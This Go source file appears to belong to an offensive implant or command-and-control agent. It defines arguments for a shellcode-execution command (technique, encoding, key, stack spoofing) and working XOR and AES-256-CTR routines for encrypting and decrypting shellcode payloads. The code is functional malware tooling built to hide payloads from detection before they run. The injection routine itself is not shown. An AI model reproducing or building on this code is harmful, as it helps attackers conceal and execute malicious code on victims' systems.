package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
)

type executeShellcodeArgs struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	Technique    string `json:"technique"`
	Encoding     string `json:"encoding"`
	Key          string `json:"key"`
	StackSpoof   bool   `json:"stack_spoof"`
}

// decodeShellcode applies the specified decoding to raw shellcode bytes.
// Supported encodings: "xor", "aes" (AES-256-CTR, first 16 bytes = IV), "none"/empty.
func decodeShellcode(data []byte, encoding, keyHex string) ([]byte, error) {
	switch encoding {
	case "", "none":
		return data, nil
	case "xor":
		return decodeXOR(data, keyHex)
	case "aes":
		return decodeAES(data, keyHex)
	default:
		return nil, fmt.Errorf("unsupported encoding %q (use none, xor, or aes)", encoding)
	}
}

func encodeData(data []byte, encoding string) (encoded []byte, keyHex string, err error) {
	switch encoding {
	case "xor":
		return encodeXOR(data)
	case "aes":
		return encodeAES(data)
	default:
		return nil, "", fmt.Errorf("unsupported encoding %q (use xor or aes)", encoding)
	}
}

func encodeXOR(data []byte) ([]byte, string, error) {
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, "", fmt.Errorf("generate key: %v", err)
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out, hex.EncodeToString(key), nil
}

func encodeAES(data []byte) ([]byte, string, error) {
	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return nil, "", fmt.Errorf("generate key: %v", err)
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, "", fmt.Errorf("generate IV: %v", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, "", fmt.Errorf("aes cipher: %v", err)
	}
	ciphertext := make([]byte, len(data))
	cipher.NewCTR(block, iv).XORKeyStream(ciphertext, data)
	return append(iv, ciphertext...), hex.EncodeToString(key), nil
}

func decodeXOR(data []byte, keyHex string) ([]byte, error) {
	if keyHex == "" {
		return nil, fmt.Errorf("xor encoding requires -key (hex-encoded key bytes)")
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid hex key: %v", err)
	}
	if len(key) == 0 {
		return nil, fmt.Errorf("xor key must be at least 1 byte")
	}
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out, nil
}

func decodeAES(data []byte, keyHex string) ([]byte, error) {
	if keyHex == "" {
		return nil, fmt.Errorf("aes encoding requires -key (hex-encoded 32-byte AES-256 key)")
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid hex key: %v", err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("aes key must be exactly 32 bytes (64 hex chars), got %d bytes", len(key))
	}
	if len(data) < aes.BlockSize {
		return nil, fmt.Errorf("aes ciphertext too short (need at least %d bytes for IV)", aes.BlockSize)
	}
	iv := data[:aes.BlockSize]
	ciphertext := data[aes.BlockSize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes cipher init: %v", err)
	}
	stream := cipher.NewCTR(block, iv)
	plaintext := make([]byte, len(ciphertext))
	stream.XORKeyStream(plaintext, ciphertext)
	return plaintext, nil
}
